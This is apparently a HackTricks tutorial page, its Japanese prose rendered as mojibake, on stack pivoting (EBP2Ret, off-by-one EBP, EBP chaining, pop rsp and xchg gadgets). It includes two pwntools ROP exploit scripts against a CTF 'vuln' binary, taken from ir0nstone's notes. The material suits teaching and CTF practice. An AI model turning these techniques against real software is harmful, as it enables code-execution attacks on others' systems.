# ã‚¹ã‚¿ãƒƒã‚¯ãƒ”ãƒœãƒƒãƒ†ã‚£ãƒ³ã‚° - EBP2Ret - EBPãƒã‚§ã‚¤ãƒ‹ãƒ³ã‚°

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã‚’é€šã˜ã¦ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã™ã‚‹ã€‚**

</details>

## åŸºæœ¬æƒ…å ±

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€**ãƒ™ãƒ¼ã‚¹ãƒã‚¤ãƒ³ã‚¿ï¼ˆEBPï¼‰**ã‚’æ“ä½œã—ã¦ã€EBPãƒ¬ã‚¸ã‚¹ã‚¿ã¨`leave; ret`å‘½ä»¤ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’æ³¨æ„æ·±ãä½¿ç”¨ã—ã¦è¤‡æ•°ã®é–¢æ•°ã®å®Ÿè¡Œã‚’ãƒã‚§ãƒ¼ãƒ³ã™ã‚‹èƒ½åŠ›ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚

å†ç¢ºèªã¨ã—ã¦ã€**`leave`**ã¯åŸºæœ¬çš„ã«æ¬¡ã®æ„å‘³ã§ã™ï¼š
```
movl               %ebp, %esp
popl               %ebp
ret
```
ãã—ã¦**EBPãŒEIPã‚ˆã‚Šã‚‚å‰ã«ã‚¹ã‚¿ãƒƒã‚¯ã«ã‚ã‚‹**ãŸã‚ã€ã‚¹ã‚¿ãƒƒã‚¯ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã§ãã‚Œã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

### EBP2Ret

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€**EBPãƒ¬ã‚¸ã‚¹ã‚¿ã‚’å¤‰æ›´ã§ãã‚‹ãŒEIPãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ç›´æ¥å¤‰æ›´ã™ã‚‹æ–¹æ³•ãŒãªã„**å ´åˆã«ç‰¹ã«æœ‰ç”¨ã§ã™ã€‚é–¢æ•°ãŒå®Ÿè¡Œã‚’çµ‚äº†ã™ã‚‹éš›ã®æŒ™å‹•ã‚’æ´»ç”¨ã—ã¾ã™ã€‚

`fvuln`ã®å®Ÿè¡Œä¸­ã«ã€ã‚¹ã‚¿ãƒƒã‚¯ã«**å½ã®EBP**ã‚’æŒ¿å…¥ã—ã€ãã‚ŒãŒãƒ¡ãƒ¢ãƒªå†…ã®ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã«æˆåŠŸã™ã‚Œã°ï¼ˆ`pop`æ“ä½œã‚’è€ƒæ…®ã—ã¦4ãƒã‚¤ãƒˆã‚’åŠ ç®—ï¼‰ã€é–“æ¥çš„ã«EIPã‚’åˆ¶å¾¡ã§ãã¾ã™ã€‚ `fvuln`ãŒæˆ»ã‚‹ã¨ã€ESPã¯ã“ã®ä½œæˆã•ã‚ŒãŸå ´æ‰€ã«è¨­å®šã•ã‚Œã€ãã®å¾Œã®`pop`æ“ä½œã«ã‚ˆã‚ŠESPãŒ4æ¸›å°‘ã—ã€å®Ÿè³ªçš„ã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æŒ‡ã™ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ `ret`å‘½ä»¤ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€åˆ¶å¾¡ãŒã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«ç§»ã‚Šã¾ã™ã€‚

#### æ”»æ’ƒæ§‹ç¯‰

ã¾ãšã€å®Ÿè¡Œå¯èƒ½ãªãƒ¡ãƒ¢ãƒªå†…ã®ã©ã“ã‹ã«**ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥**ã—ã€**ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—**ã™ã‚‹ã‹ã€æœ‰åŠ¹ãª[**ONE\_GADGET**](https://github.com/david942j/one\_gadget)ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã™ã‚‹ã‹ã€ã¾ãŸã¯ESPã‚’`system()`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒç¶šã**4ã¤ã®ãƒ€ãƒŸãƒ¼ãƒã‚¤ãƒˆ**ã¨`"/bin/sh"`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒã‚ã‚‹å ´æ‰€ã‚’æŒ‡ã™ã‚ˆã†ã«ã—ã¾ã™ã€‚

æ¬¡ã«ã€ãƒ‘ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½œæˆã—ã€`ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰/one_gadgetã®ã‚¢ãƒ‰ãƒ¬ã‚¹ - 4`ã§EBPã‚’**å¦¥å”**ã—ã¾ã™ã€‚ `pop`ã®ãŸã‚ã«`-4`ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®å¾Œã€`ESP`ã¯æœ›ã¾ã—ã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã—ã€`ret`ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

#### Off-By-One Exploit

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®ç‰¹å®šã®ãƒãƒªã‚¢ãƒ³ãƒˆã¯ã€ã€ŒOff-By-One Exploitã€ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€**EBPã®æœ€ã‚‚ä¸‹ä½ãƒã‚¤ãƒˆã®ã¿ã‚’å¤‰æ›´ã§ãã‚‹å ´åˆ**ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ãã®ã‚ˆã†ãªå ´åˆã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ ¼ç´ã™ã‚‹ãƒ¡ãƒ¢ãƒªä½ç½®ã¯ã€EBPã¨æœ€åˆã®3ãƒã‚¤ãƒˆã‚’å…±æœ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã‚ˆã‚Šåˆ¶ç´„ã®ã‚ã‚‹æ¡ä»¶ã§åŒæ§˜ã®æ“ä½œãŒå¯èƒ½ã§ã™ã€‚

### **EBP Chaining**

ã—ãŸãŒã£ã¦ã€ã‚¹ã‚¿ãƒƒã‚¯ã®`EBP`ã‚¨ãƒ³ãƒˆãƒªã«åˆ¶å¾¡ã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’é…ç½®ã—ã€`EIP`ã«`leave; ret`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’é…ç½®ã™ã‚‹ã¨ã€**`ESP`ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰åˆ¶å¾¡ã•ã‚ŒãŸ`EBP`ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ç§»å‹•**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»Šã€**`ESP`**ã¯æœ›ã¾ã—ã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã—ã€æ¬¡ã«å®Ÿè¡Œã•ã‚Œã‚‹å‘½ä»¤ã¯`RET`ã§ã™ã€‚ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã€åˆ¶å¾¡ã•ã‚ŒãŸESPã®å ´æ‰€ã«æ¬¡ã®ã‚‚ã®ã‚’é…ç½®ã§ãã¾ã™ï¼š

- **`&(æ¬¡ã®å½ã®EBP)`** -> `leave`å‘½ä»¤ã‹ã‚‰`pop ebp`ã«ã‚ˆã£ã¦æ–°ã—ã„EBPã‚’ãƒ­ãƒ¼ãƒ‰
- **`system()`** -> `ret`ã«ã‚ˆã£ã¦å‘¼ã³å‡ºã•ã‚Œã‚‹
- **`&(leave;ret)`** -> ã‚·ã‚¹ãƒ†ãƒ ãŒçµ‚äº†ã—ãŸå¾Œã«å‘¼ã³å‡ºã•ã‚Œã€ESPã‚’å½ã®EBPã«ç§»å‹•ã•ã›ã¦å†é–‹
- **`&("/bin/sh")`** -> `system`ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

åŸºæœ¬çš„ã«ã€ã“ã®æ–¹æ³•ã§è¤‡æ•°ã®å½ã®EBPã‚’ãƒã‚§ãƒ¼ãƒ³åŒ–ã—ã¦ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ•ãƒ­ãƒ¼ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ­£ç›´è¨€ã£ã¦ã€ã“ã‚Œã¯[ret2lib](ret2lib/)ã®ã‚ˆã†ãªã‚‚ã®ã§ã™ãŒã€æ˜ã‚‰ã‹ãªåˆ©ç‚¹ã¯ãªãã€ã„ãã¤ã‹ã®ã‚¨ãƒƒã‚¸ã‚±ãƒ¼ã‚¹ã§èˆˆå‘³æ·±ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã•ã‚‰ã«ã€ã“ã“ã«ã¯ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦**ã‚¹ã‚¿ãƒƒã‚¯ã®ãƒªãƒ¼ã‚¯**ã‚’è¡Œã„ã€å‹åˆ©é–¢æ•°ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®[**ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã®ä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ãƒšãƒ¼ã‚¸ã‹ã‚‰ã®æœ€çµ‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã™ã€‚
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## RSPã‚’åˆ¶å¾¡ã™ã‚‹ä»–ã®æ–¹æ³•

### **`pop rsp`** ã‚¬ã‚¸ã‚§ãƒƒãƒˆ

[**ã“ã®ãƒšãƒ¼ã‚¸**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) ã«ã¯ã€ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ãŸä¾‹ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã§ã¯ã€2ã¤ã®ç‰¹å®šã®å¼•æ•°ã‚’æŒã¤é–¢æ•°ã‚’å‘¼ã³å‡ºã™å¿…è¦ãŒã‚ã‚Šã€**`pop rsp` ã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ãŒå¿…è¦ã§ã€**ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ã®ãƒªãƒ¼ã‚¯**ãŒã‚ã‚Šã¾ã—ãŸã€‚
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<rag>, rsp ã‚¬ã‚¸ã‚§ãƒƒãƒˆ
```
pop <reg>                <=== return pointer
<reg value>
xchg <rag>, rsp
```
## å‚è€ƒæ–‡çŒ®

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã¾ãŸã¯[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ãŠã‚ˆã³**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
